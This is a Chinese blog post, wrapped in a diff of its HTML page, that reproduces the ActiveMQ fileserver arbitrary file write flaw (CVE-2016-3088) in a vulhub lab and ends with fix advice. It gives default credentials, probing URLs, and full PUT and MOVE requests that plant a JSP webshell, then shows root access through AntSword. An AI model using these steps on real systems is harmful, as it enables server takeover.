@@ -1,0 +1,267 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ActiveMQ任意文件写入漏洞 | Daydust's Blog</title><meta name="author" content="庆尘"><meta name="copyright" content="庆尘"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Active mq最近爆出了RCE，使得越来越多的人回来关注mq的安全情况，本文讲解了mq的任意文件上传漏洞(CVE-2016-3088)的原理，漏洞成因和复现过程。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ActiveMQ任意文件写入漏洞">
+<meta property="og:url" content="http://example.com/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Daydust&#39;s Blog">
+<meta property="og:description" content="Active mq最近爆出了RCE，使得越来越多的人回来关注mq的安全情况，本文讲解了mq的任意文件上传漏洞(CVE-2016-3088)的原理，漏洞成因和复现过程。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avater.jpg">
+<meta property="article:published_time" content="2023-11-03T10:26:27.000Z">
+<meta property="article:modified_time" content="2023-11-30T02:36:10.644Z">
+<meta property="article:author" content="庆尘">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avater.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ActiveMQ任意文件写入漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-30 10:36:10'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Daydust's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avater.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Daydust's Blog"><span class="site-name">Daydust's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ActiveMQ任意文件写入漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-03T10:26:27.000Z" title="发表于 2023-11-03 18:26:27">2023-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-30T02:36:10.644Z" title="更新于 2023-11-30 10:36:10">2023-11-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%BF%BD%E6%B4%9E%E8%AE%A1%E5%88%92/">追洞计划</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ActiveMQ任意文件写入漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>漏洞名称：<strong>ActiveMQ任意文件上传漏洞</strong></p>
+<p>漏洞编号：<strong>CVE-2016-3088</strong></p>
+<p>影响版本：Apache ActiveMQ 5.x~5.14.0</p>
+<ul>
+<li>该漏洞基于fileserver应用，ActiveMQ在<strong>5.12.x~5.13.x</strong>版本已经<strong>默认关闭</strong>fileserver，但是被开启</li>
+<li>并且<strong>5.14.0</strong>之后就将fileserver彻底删除了</li>
+<li>只有目标的fileserver服务开启，才存在该漏洞</li>
+</ul>
+<p>随着ActiveMQ的启动，会打开两个端口，61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口</p>
+<p>登录的默认账密：<strong>admin&#x2F;admin</strong></p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>漏洞产生原因：</p>
+<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中</p>
+<ul>
+<li>admin是管理员页面</li>
+<li>api是接口</li>
+<li>fileserver是储存文件的接口</li>
+</ul>
+<p>admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入（PUT请求）文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件上传漏洞。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>因为CVE-2016-3088这个漏洞环境在vulhub上有，所以这里我直接选择使用vulhub来搭建这个漏洞环境，漏洞环境位于vulhub中的ActiveMQ目录下</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-nwml.png" alt="image-nwml"></p>
+<p>具体的搭建这里就不讲了，搭建之后会开启两个端口服务，就是上面我们提到的ActiveMQ服务对应的两个端口</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-phgq.png" alt="image-phgq"></p>
+<p>这里直接访问本机的8161端口即可来到ActiveMQ的web页面</p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ul>
+<li>vulhub靶机：192.168.149.129</li>
+<li>物 理 机：172.21.126.244</li>
+</ul>
+<p>Web页面：<a target="_blank" rel="noopener" href="http://192.168.149.129:8161/">http://192.168.149.129:8161</a></p>
+<p>访问之后页面如下：</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-nsuy.png" alt="image-nsuy"></p>
+<h3 id="探测版本信息"><a href="#探测版本信息" class="headerlink" title="探测版本信息"></a>探测版本信息</h3><p>访问如下页面即可探测到该ActiveMQ应用的版本信息</p>
+<pre><code>http://host:8161/admin/index.jsp?printable=true
+</code></pre>
+<p>注意：因为admin应用是管理员页面，所以需要登录,尝试默认密码登录即可</p>
+<p>结果如下</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-mpyu.png" alt="image-mpyu"></p>
+<p>可以看到目前的版本是<strong>5.11.1</strong>，为存在漏洞的应用版本，尝试利用该漏洞</p>
+<h3 id="探测绝对路径"><a href="#探测绝对路径" class="headerlink" title="探测绝对路径"></a>探测绝对路径</h3><p>访问如下路径，该路径是一个测试页面，展示了ActiveMQ应用的绝对路径</p>
+<pre><code>http://host:8161/admin/test/systemProperties.jsp
+</code></pre>
+<p>如下</p>
+<p>找到activemq.home，即为该应用的绝对路径，如下</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-yscj.png" alt="image-yscj"></p>
+<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><pre><code class="jsp">PUT /fileserver/2.txt HTTP/1.1
+Host: localhost:8161
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Length: 120976
+
+webshell...
+</code></pre>
+<p>这个请求体的位置就是jsp一句话木马的内容，而请求fileserver&#x2F;2.txt就是利用fileserver支持put请求写入文件的特性，写入2.txt,那有人问了，为什么不直接写入jsp文件，而是写入为txt文件？</p>
+<blockquote>
+<p>这是因为前面也讲到了，fileserver虽然支持put请求写入文件，但是无法解析jsp，所以只需要写入一个txt文件，待会再利用move请求移动文件的同时进行重命名修改后缀名即可</p>
+</blockquote>
+<p>直接写入jsp文件也行，只是动静稍微大一点，隐蔽性差点，如果存在上传的waf就很可能被kill了，我们的目标是先把我们的马上传上去，动静自然越小越好</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-vyim.png" alt="image-vyim"></p>
+<p>回显204即为上传成功，注意这里要使用PUT请求</p>
+<p>此时可以访问上传的路径看看文件是否被成功上传</p>
+<pre><code class="http">http://host:8161/fileserver/2.txt
+</code></pre>
+<p>这里的2.txt是刚才put请求中上传的文件，师傅们根据自己的场景来就行</p>
+<p>访问之后结果如下</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-lrts.png" alt="image-lrts"></p>
+<p>可以看到已经成功上传了</p>
+<h3 id="移动木马位置"><a href="#移动木马位置" class="headerlink" title="移动木马位置"></a>移动木马位置</h3><p>这里已经成功上传了，但是还有一个问题，这个fileserver目录下的jsp文件无法解析，这时候应该怎么办呢？这是我们就可以利用fileserver支持的另一个请求——move（将木马的位置移动到能够解析的位置）</p>
+<pre><code class="htp">MOVE /fileserver/2.txt HTTP/1.1
+Destination: file:///opt/activemq/webapps/api/2.jsp
+Host: localhost:8161
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Length: 0
+</code></pre>
+<p>这里的destination请求头的值就是你要移动的目标位置，因为我这里的靶场探测到目标的ActiveMQ的绝对路径下的&#x2F;opt&#x2F;activemq目录，所以这里我们选择把木马移动到activemq的webapps&#x2F;api目录下，如下</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-cxnr.png" alt="image-cxnr"></p>
+<p>同样的，204回显代表移动成功，此时可以访问如下路径查看是否成功移动（需要登录)</p>
+<pre><code class="http">http://host:8161/api
+</code></pre>
+<p>可以看到已经成功移动到了api目录下</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-jscz.png" alt="image-jscz"></p>
+<h3 id="webshell使用"><a href="#webshell使用" class="headerlink" title="webshell使用"></a>webshell使用</h3><p>我们可以访问这个2.jsp文件，看看木马能否正常使用</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-zisj.png" alt="image-zisj"></p>
+<p>可以看到，能够正常访问和解析，但是有报错，这个不影响，尝试命令执行</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-qzlk.png" alt="image-qzlk"></p>
+<p>可以看到直接就是root权限，因为api目录是root权限创建的</p>
+<p>尝试连接webshell管理工具，这里我使用的蚁剑</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-khfa.png" alt="image-khfa"></p>
+<p>这里还有一个问题，webshell连接工具在连接时会显示无法连接，甚至出现报错，请问这是什么原因呢？</p>
+<blockquote>
+<p>其实仔细想一下就能理解为什么会报错了，你想一下你浏览器访问到这个2.jsp的前提是什么？前提就是登录，不登录就无法查看，那我们应该<strong>怎么让蚁剑模拟登录</strong>呢？——设置Cookie</p>
+</blockquote>
+<p>这里的Cookie没有鉴权作用，真正起到鉴权作用的是</p>
+<blockquote>
+<p>Authorization: Basic YWRtaW46YWRtaW4&#x3D;</p>
+</blockquote>
+<p>也就是账号密码</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-dvab.png" alt="image-dvab"></p>
+<p>再测试连接</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-hncu.png" alt="image-hncu"></p>
+<p>连接成功</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-sjrb.png" alt="image-sjrb"></p>
+<p>成功拿到目标机器的root权限</p>
+<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p>
+<p>2、通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能</p>
+<p><img src="/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-eyza.png" alt="image-eyza"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">庆尘</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/">http://example.com/2023/11/03/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Daydust's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post_share"><div class="social-share" data-image="/img/avater.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2023/11/03/%E5%AF%B9SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%9A%84%E6%80%9D%E8%80%83/" title="对SQL注入漏洞原理的思考"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">对SQL注入漏洞原理的思考</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avater.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">庆尘</div><div class="author-info__description">有些人说看不到未来,其实是看到了未来</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/daydust" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_63844103?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:1597128781@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">不要让时代的悲哀，成为你的悲哀</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-text">复现步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-text">探测版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">探测绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0webshell"><span class="toc-text">上传webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E6%9C%A8%E9%A9%AC%E4%BD%8D%E7%BD%AE"><span class="toc-text">移动木马位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E4%BD%BF%E7%94%A8"><span class="toc-text">webshell使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-text">修复方案</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94RBAC%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" title="代码审计—RBAC权限管理系统">代码审计—RBAC权限管理系统</a><time datetime="2023-12-03T11:08:28.000Z" title="发表于 2023-12-03 19:08:28">2023-12-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/30/Spring-security-RegexRequestMatcher%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" title="Spring-security RegexRequestMatcher认证绕过漏洞">Spring-security RegexRequestMatcher认证绕过漏洞</a><time datetime="2023-11-30T02:24:20.000Z" title="发表于 2023-11-30 10:24:20">2023-11-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/23/%E4%BD%BF%E7%94%A8frps%E5%92%8Cfrpc%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="使用frps和frpc进行内网穿透">使用frps和frpc进行内网穿透</a><time datetime="2023-11-23T04:00:42.000Z" title="发表于 2023-11-23 12:00:42">2023-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/04/SSH%E4%B8%A4%E7%A7%8D%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/" title="SSH两种远程登录方式及原理剖析">SSH两种远程登录方式及原理剖析</a><time datetime="2023-11-04T03:12:54.000Z" title="发表于 2023-11-04 11:12:54">2023-11-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/04/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E5%BC%8F(%E4%B8%8B)-%E5%9B%BE%E5%83%8F%E9%AA%8C%E8%AF%81%E7%A0%81/" title="验证码漏洞挖掘方式-下-图像验证码">验证码漏洞挖掘方式-下-图像验证码</a><time datetime="2023-11-04T02:41:59.000Z" title="发表于 2023-11-04 10:41:59">2023-11-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 庆尘</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
